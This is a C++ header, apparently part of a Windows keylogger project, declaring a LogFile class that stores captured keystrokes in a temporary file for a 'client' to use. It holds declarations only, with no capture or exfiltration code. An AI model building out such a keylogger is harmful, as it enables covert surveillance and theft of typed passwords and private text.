#pragma once
#include <Windows.h>

/*
	Class to represent a log file for the keylogger
	It creates a temporary file upon initialization
	which is later used to append keylogged data into
*/
class LogFile
{
public:
	LogFile();	// ctor
	~LogFile(); // dtor

	void AppendString(char* str);
	void FlushContents();
	int GetFileSize();

	// used by client
	char logFileName[MAX_PATH];
};